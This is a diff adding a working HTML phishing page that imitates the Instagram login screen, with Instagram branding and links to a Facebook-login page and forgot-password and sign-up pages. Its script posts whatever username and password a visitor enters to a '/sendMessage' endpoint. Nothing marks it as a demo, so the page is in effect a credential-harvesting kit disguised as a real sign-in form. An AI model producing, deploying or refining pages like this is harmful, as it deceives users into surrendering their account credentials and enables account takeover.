@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="CONTENT-TYPE" 
+    name="viewport" content="maximum-scale=1.0, initial-scale=1.0, charset=UTF-8, user-scalable=no">
+  <title>Hello, World!</title>
+  <style>
+    @font-face{
+      font-family: "Billabong";
+      src: url("Billabong.ttf");
+    }
+    body{
+      user-select: none;
+      overflow: hidden;
+    }
+    #back{
+      background: linear-gradient(to bottom right, #4c68d7, #ff2679, #fd486b, #fbad50, #fccc63);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      top: 0;
+      flex-direction: column;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      position: absolute;
+    }
+    #whitebox{
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      background-color: white;
+      width: 60%;
+      height: 59%;
+    }
+    #signup{
+      display: flex;
+      justify-content: center;
+      text-align: center;
+      align-items: center;
+      font-size: 13px;
+      background-color: white;
+      width: 60%;
+      height: 19%;
+    }
+    #signup span{
+      transition: all 0.2s ease-in-out;
+    }
+    #signup span:hover{
+      font-size: 15px;
+    }
+    #tran{
+      width: 60%;
+      height: 2%;
+    }
+    #insta{
+      display: flex;
+      width: 100%;
+      height: 35%;
+      background-color: white;
+      color: black;
+      text-align: center;
+      justify-content: center;
+      align-items: center;
+      font-family: "Billabong";
+      font-size: 45px;
+    }
+    #input1, #input2 {
+  font-size: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background-color: white;
+  width: 100%;
+  caret-color: #fd486b;
+  height: 10%;
+  position: relative;
+}
+ .password-wrapper {
+  width: 89%; /* Same as username input */
+   height: 98%;
+  position: relative;
+  display: flex;
+  align-items: center;
+   justify-content:center;
+}
+    input[type=text]{
+      font-size: 0.5em; /* Adjusted for better consistency */
+      width: 80%;
+      height: 50%;
+      outline: none;
+    }
+    input[type=password]{
+      font-size: 0.5em; /* Adjusted for better consistency */
+      width:80%;
+      height:50%;
+      outline: none;
+    }
+  
+    input[type=name]{
+      font-size: 0.5em; /* Adjusted for better consistency */
+      width: 70.5%;
+      height: 50%;
+      outline: none;
+    }
+    input::placeholder {
+      font-size: 0.8em;
+    }
+    #Show{
+      width:20px;
+      height:20px;
+      outline:none;
+      border-radius:10%;
+    }
+    #login{
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: white;
+      width: 100%;
+      height: 10%;
+    }
+    #LoginButton{
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #2196F3;
+      color: white;
+      width: 80%;
+      font-size:0.6em;
+      height: 50%;
+      border-radius: 2%;
+      text-align: center;
+      border: 0.5px solid grey;
+      cursor: pointer;
+      transition: all 0.2s ease-in-out;
+    }
+    #LoginButton:hover{
+      padding: 2px;
+    }
+    #or{
+      font-size: 10px;
+      align-items: center;
+      display: flex;
+      justify-content: space-evenly;
+      width: 100%;
+      background-color: white;
+      height: 15%;
+    }
+    #mid{
+      width: 40%;
+      height: 1px;
+      background-color: grey;
+    }
+    #fb{
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 12.5%;
+      width: 100%;
+      text-align: center;
+      background-color: white;
+      transition: all 0.2s ease-in-out;
+      font-size: 12px;
+    }
+    #fb:hover{
+            font-size: 14px;
+    }
+    #forgot{
+      display: flex;
+      width: 100%;
+      height: 12.5%;
+      justify-content: center;
+      align-items: center;
+      background-color: white;
+      text-align: center;
+      font-size: 10px;
+      color: grey;
+    }
+    #LoginButton:disabled{
+      background-color: grey;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <div id="back">
+    <div id="whitebox">
+      <div id="insta">
+        <span>Instagram</span>
+      </div>
+    <div id="input1">
+  <input placeholder="Phone number, username or email" type="text" id="usrname">
+</div>
+<div id="input2">
+  <div class="password-wrapper">
+    <input placeholder="Password" type="password" id="pass">
+    <span class="toggle-password" onclick="togglePassword()">
+      <img id="Show" src="eye-open.png.jpg">
+    </span>
+  </div>
+</div>
+
+      <div id="login">
+        <button id="LoginButton" onclick="goto()" disabled>Log In</button>
+      </div>
+      <div id="or">
+        <div id="mid"></div>
+        OR
+        <div id="mid"></div>
+      </div>
+      <div id="fb">
+        <span onclick="location.href='fblogin.html'">
+          <img src="fb.jpg" style="width:13px;height:13px;">
+          Log in with Facebook
+        </span>
+      </div>
+      <div id="forgot">
+        <span onclick="location.href='Forgot.html'">
+          Forgot password?
+        </span>
+      </div>
+    </div>
+    <div id="tran"></div>
+    <div id="signup">
+      <div style="font-size:12px;">
+        Don&#146t have an account? <span style="color:#2196F3;" onclick="location.href='Signup.html'">Sign up.</span>
+      </div>
+    </div>
+  </div>
+ <script>
+  const username = document.getElementById('usrname');
+  const password = document.getElementById('pass');
+  const loginButton = document.getElementById('LoginButton');
+  const show = document.getElementById('Show');
+
+  show.addEventListener("click", ShowPass);
+
+  function ShowPass() {
+  if (password.type === "password") {
+    password.type = "text"; // Should be "text" instead of "name"
+    show.src = "eye-close.png.jpg"; // Assuming the correct image file is used
+  } else {
+    password.type = "password";
+    show.src = "eye-open.png.jpg"; // Correcting the image extension
+  }
+}
+
+
+  username.addEventListener("input", check);
+  password.addEventListener("input", check);
+
+  function check() {
+    loginButton.disabled = !(
+      username.value.trim() !== '' &&
+      password.value.trim().length >= 5 &&
+      password.value.trim().length <= 8
+    );
+  }
+  function goto() {
+  const user = username.value;
+  const pass = password.value;
+
+  fetch('/sendMessage', {
+    method: 'POST',
+    headers: {
+      'Content-Type':'application/json',
+    },
+    body: JSON.stringify({
+      username: user,
+      password: pass
+    })
+  })
+  .then(response => response.json())
+  .then(data => console.log(data))    
+  .catch(error => console.error('Error:', error));
+}
+
+</script>
+
+</body>
+</html>
+
